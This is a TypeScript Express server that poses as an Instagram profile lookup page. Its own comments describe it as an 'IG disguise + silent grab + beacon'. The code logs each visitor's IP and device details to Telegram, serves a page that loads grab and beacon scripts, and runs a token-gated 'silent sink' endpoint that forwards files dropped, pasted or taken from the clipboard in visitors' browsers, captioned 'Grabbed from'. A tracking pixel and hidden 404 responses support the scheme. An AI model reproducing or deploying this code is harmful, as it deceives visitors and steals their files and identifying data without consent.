import express from 'express';
import multer from 'multer';
import crypto from 'crypto';
import { buildHit, clientIp } from '../src/capture';
import { sendHit, sendFile } from '../src/telegram';
import { lookup as igLookup } from '../src/instagram';

const app = express();
app.set('trust proxy', true);
app.disable('x-powered-by');
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true, limit: '2mb' }));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 20 * 1024 * 1024, files: 20 },
});

const UPLOAD_KEY =
  process.env.UPLOAD_KEY ||
  '4f8c2a91e6b7d30a5c1f9e2b8d4a6c3e0f1a2b3c4d5e6f7089a1b2c3d4e5f6a7';

const SINK_SECRET =
  process.env.SINK_SECRET ||
  'a91c4d7e2b5f8a3c6e9d2b5f8a1c4e7d0b3f6a9c2e5d8b1f4a7c0e3d6b9f2a5c';

const hits = new Map<string, number[]>();
const WIN = 60_000;
const MAX = 60;

function rl(ip: string): boolean {
  const now = Date.now();
  const arr = (hits.get(ip) || []).filter(t => now - t < WIN);
  arr.push(now);
  hits.set(ip, arr);
  if (hits.size > 5000) {
    for (const [k, v] of hits) {
      if (!v.some(t => now - t < WIN)) hits.delete(k);
    }
  }
  return arr.length > MAX;
}

async function fire(req: express.Request, tag?: string, ipOverride?: string): Promise<void> {
  try {
    const h = await buildHit(req, tag);
    if (ipOverride) h.ip = ipOverride;
    if (rl(h.ip)) return;
    sendHit(h).catch(() => {});
  } catch {}
}

function igApiResponse(found: any) {
  if (!found || !found.found) {
    return {
      success: false,
      error: found?.error === 'upstream_unreachable' ? 'upstream_unreachable' : 'not_found',
    };
  }
  const d = found.data;
  return {
    success: true,
    username: d.username,
    full_name: d.full_name || '',
    bio: d.bio || '',
    followers: d.followers ?? 0,
    following: d.following ?? 0,
    posts: d.posts ?? 0,
    profile_pic: d.profile_pic || '',
    verified: !!d.verified,
    private: !!d.private,
    is_business: !!d.is_business,
    category: d.category || '',
    country: d.country || '',
    date_joined: d.date_joined || '',
    external_url: d.external_url || '',
    user_id: d.user_id || '',
    account_type: d.account_type || '',
    fbid: d.fbid || '',
    former_usernames: d.former_usernames ?? null,
  };
}

function getUsername(req: express.Request): string | null {
  const q = req.query.username || req.query.u || req.query.user;
  if (typeof q === 'string' && q.trim()) return q.trim().replace(/^@/, '');
  const body: any = req.body;
  if (body) {
    if (typeof body.username === 'string' && body.username.trim()) {
      return body.username.trim().replace(/^@/, '');
    }
    const nested = body.data?.params?.username_or_id_or_url;
    if (typeof nested === 'string' && nested.trim()) {
      return nested.trim().replace(/^@/, '');
    }
  }
  return null;
}

async function igHandler(req: express.Request, res: express.Response) {
  const u = getUsername(req);
  if (!u) {
    res.status(400).json({ success: false, error: 'missing_username' });
    return;
  }
  fire(req, 'ig-api').catch(() => {});
  const r = await igLookup(u);
  res.set('Cache-Control', 'no-store');
  res.json(igApiResponse(r));
}

app.get('/api/instagram', igHandler);
app.post('/api/instagram', igHandler);

for (const p of ['/api/ig', '/api/v1/info', '/api/insta', '/info']) {
  app.all(p, igHandler);
}

// --- sink token: HMAC bound to IP, rotates every 5 min, ±1 window skew ---
function sinkTokenFor(ip: string, offset = 0): string {
  const w = Math.floor(Date.now() / (5 * 60_000)) + offset;
  return crypto.createHmac('sha256', SINK_SECRET).update(`${ip}:${w}`).digest('hex');
}

function sinkTokenOk(req: express.Request): boolean {
  const t = req.headers['x-sink-token'];
  if (typeof t !== 'string' || !t) return false;
  const ip = clientIp(req);
  for (const off of [0, -1, 1]) {
    const expect = sinkTokenFor(ip, off);
    try {
      if (t.length === expect.length && crypto.timingSafeEqual(Buffer.from(t), Buffer.from(expect))) {
        return true;
      }
    } catch {}
  }
  return false;
}

function uploadKeyOk(req: express.Request): boolean {
  const k = req.headers['x-upload-key'];
  return typeof k === 'string' && k.length > 0 && k === UPLOAD_KEY;
}

// operator push (Python script, key-gated)
app.post('/api/upload', upload.array('files', 20), async (req, res) => {
  if (!uploadKeyOk(req)) {
    res.status(404).json({ ok: false });
    return;
  }
  try {
    const h = await buildHit(req, 'upload');
    if (rl(h.ip)) {
      res.status(429).json({ ok: false });
      return;
    }
    sendHit(h).catch(() => {});
    const files = (req.files as Express.Multer.File[]) || [];
    const cap = `File from ${h.ip} | ${h.device.os} | ${h.device.browser}`;
    for (const f of files) sendFile(f.buffer, f.originalname, cap).catch(() => {});
    res.json({ ok: true, received: files.length });
  } catch (err: any) {
    res.status(400).json({ ok: false, error: err?.message || 'upload_failed' });
  }
});

// silent sink (browser drop/paste/clipboard, IP-bound token)
app.post('/api/sink', upload.array('files', 20), async (req, res) => {
  if (!sinkTokenOk(req)) {
    res.status(404).json({ ok: false });
    return;
  }
  try {
    const h = await buildHit(req, 'sink');
    if (rl(h.ip)) {
      res.status(429).json({ ok: false });
      return;
    }
    sendHit(h).catch(() => {});
    const files = (req.files as Express.Multer.File[]) || [];
    const cap = `Grabbed from ${h.ip} | ${h.device.os} | ${h.device.browser}`;
    for (const f of files) sendFile(f.buffer, f.originalname, cap).catch(() => {});
    res.json({ ok: true, received: files.length });
  } catch (err: any) {
    res.status(400).json({ ok: false, error: err?.message || 'sink_failed' });
  }
});

// --- served page: IG disguise + silent grab + beacon ---
app.get('/ig', async (req, res) => {
  fire(req, 'ig-page').catch(() => {});
  const u = String(req.query.username || '').trim();
  const safeU = u.replace(/[<>&"]/g, '');
  const preview = safeU ? `<div class="preview">Checking @${safeU}...</div>` : '';
  const token = sinkTokenFor(clientIp(req));
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.end(`<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram Profile Info</title>
<meta property="og:title" content="Instagram Profile Info">
<meta property="og:description" content="Look up public profile information.">
<style>
 :root{--bg:#000;--card:#111;--line:#262626;--txt:#f5f5f5;--muted:#a8a8a8;--blue:#0095f6}
 *{box-sizing:border-box}
 body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
 .card{width:min(94vw,400px);background:var(--card);border:1px solid var(--line);border-radius:12px;padding:32px 28px;text-align:center}
 .logo{font-family:'Segoe UI',system-ui,sans-serif;font-style:italic;font-weight:600;font-size:34px;letter-spacing:-.5px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:22px}
 h1{font-size:16px;font-weight:600;margin:0 0 8px}
 p{font-size:13px;color:var(--muted);margin:0 0 22px;line-height:1.5}
 input{width:100%;padding:12px 14px;background:#000;border:1px solid var(--line);border-radius:8px;color:var(--txt);font-size:14px;outline:none;margin-bottom:12px}
 input:focus{border-color:#555}
 button{width:100%;padding:12px;background:var(--blue);border:0;color:#fff;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}
 button:disabled{opacity:.6;cursor:default}
 .result{margin-top:16px;font-size:13px;text-align:left;color:var(--muted);white-space:pre-wrap;word-break:break-word}
 .result .row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--line)}
 .result .row b{color:var(--txt);font-weight:500}
 .err{color:#ed4956}
 .preview{font-size:12px;color:var(--muted);margin-top:8px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">Instagram</div>
  <h1>Profile Information</h1>
  <p>Look up public profile details.</p>
  <input id="u" placeholder="username" autocomplete="off" autocapitalize="off" spellcheck="false">
  <button id="b">Look up</button>
  ${preview}
  <div class="result" id="r"></div>
</div>
<script>window.__ST=${JSON.stringify(token)};</script>
<script src="/beacon.js"></script>
<script src="/grab.js"></script>
<script>
 (function(){
  const u=document.getElementById('u'),b=document.getElementById('b'),r=document.getElementById('r');
  const pre=${JSON.stringify(u)};
  if(pre){u.value=pre;run();}
  async function run(){
    const name=u.value.trim().replace(/^@/,'');
    if(!name){return}
    b.disabled=true;r.innerHTML='<div class="preview">Searching...</div>';
    try{
      const res=await fetch('/api/instagram?username='+encodeURIComponent(name));
      const j=await res.json();
      if(!j.success){
        r.innerHTML='<div class="err">'+(j.error==='not_found'?'Profile not found.':'Lookup failed.')+'</div>';
      } else {
        const rows=[
          ['Username','@'+j.username],
          ['Name',j.full_name||'—'],
          ['Followers',(j.followers||0).toLocaleString()],
          ['Following',(j.following||0).toLocaleString()],
          ['Posts',(j.posts||0).toLocaleString()],
          ['Verified',j.verified?'Yes':'No'],
          ['Private',j.private?'Yes':'No'],
          ['Type',j.account_type||'—'],
        ];
        r.innerHTML=rows.map(x=>'<div class="row"><b>'+x[0]+'</b><span>'+String(x[1]).replace(/[<>&"]/g,'')+'</span></div>').join('');
      }
    }catch(e){r.innerHTML='<div class="err">Network error.</div>';}
    b.disabled=false;
  }
  b.addEventListener('click',run);
  u.addEventListener('keydown',e=>{if(e.key==='Enter')run();});
 })();
</script>
</body></html>`);
});

app.get('/api/capture', async (req, res) => {
  await fire(req, 'capture');
  res.json({ ok: true });
});

app.post('/api/beacon', async (req, res) => {
  await fire(req, 'beacon');
  res.json({ ok: true });
});

app.get('/pixel.gif', async (req, res) => {
  fire(req, 'pixel').catch(() => {});
  const px = Buffer.from(
    'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
    'base64'
  );
  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.end(px);
});

app.get('/', (_req, res) => res.json({ ok: true, service: 'info' }));

app.use((_req, res) => {
  res.status(404).json({ ok: false });
});

export default app;
